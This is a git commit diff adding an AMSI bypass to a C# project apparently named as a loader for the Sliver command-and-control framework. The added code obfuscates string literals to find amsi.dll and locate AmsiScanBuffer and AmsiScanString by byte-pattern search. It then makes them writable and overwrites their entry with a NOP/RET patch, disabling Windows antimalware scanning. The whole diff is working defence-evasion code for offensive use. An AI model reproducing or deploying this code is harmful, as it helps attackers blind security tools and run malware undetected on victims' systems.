4f8f49f4c197f4d72ddaf54674481dfb0585344a
jamu85 <jamu85@icloud.com>
2024-09-25 17:15:13 +0700

    Add amsi bypass

--- SliverBypassLoader/Program.cs
+++ SliverBypassLoader/Program.cs
@@ -25,6 +25,65 @@ namespace SliverBypassLoader
         { 
         
         }
+
+        // Dynamically search for and patch AmsiScanBuffer and AmsiScanString
+        static int Bypass()
+        {
+            Char c1, c2, c3, c4, c5, c6, c7, c8, c9, c10;
+            c1 = 'A';
+            c2 = 's';
+            c3 = 'c';
+            c4 = 'n';
+            c5 = 'l';
+            c6 = 't';
+            c7 = 'z';
+            c8 = 'U';
+            c9 = 'y';
+            c10 = 'o';
+            string[] filePaths = Directory.GetFiles(@"c:\wind" + c10 + "ws\\s" + c9 + "stem32", "a?s?.d*");
+            string libname = (filePaths[0].Substring(filePaths[0].Length - 8));
+            try
+            {
+                uint lpflOldProtect;
+                var lib = LoadLibrary(libname);
+                // AmsiUacInitialize
+                var baseaddr = GetProcAddress(lib, c1 + "m" + c2 + "i" + c8 + "a" + c3 + "I" + c4 + "i" + c6 + "ia" + c5 + "i" + c7 + "e");
+                int buffsize = 1000;
+                var randoffset = baseaddr - buffsize;
+                IntPtr hProcess = GetCurrentProcess();
+                byte[] addrBuf = new byte[buffsize];
+                IntPtr nRead = IntPtr.Zero;
+                ReadProcessMemory(hProcess, randoffset, addrBuf, addrBuf.Length, out nRead);
+                byte[] asb = new byte[7] { 0x4c, 0x8b, 0xdc, 0x49, 0x89, 0x5b, 0x08 };
+                Int32 asbrelloc = (PatternAt(addrBuf, asb)).First();
+                var funcaddr = baseaddr - (buffsize - asbrelloc);
+                VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
+                Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);
+                byte[] ass = new byte[7] { 0x48, 0x83, 0xec, 0x38, 0x45, 0x33, 0xdb };
+                Int32 assrelloc = (PatternAt(addrBuf, ass)).First();
+                funcaddr = baseaddr - (buffsize - assrelloc);
+                VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
+                Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());
+                Console.WriteLine("Could not patch " + libname + "...");
+            }
+
+            return 0;
+        }
+
+        public static IEnumerable<int> PatternAt(byte[] source, byte[] pattern)
+        {
+            for (int i = 0; i < source.Length; i++)
+            {
+                if (source.Skip(i).Take(pattern.Length).SequenceEqual(pattern))
+                {
+                    yield return i;
+                }
+            }
+        }
     }
 
     // InstallUtill uninstall bypass
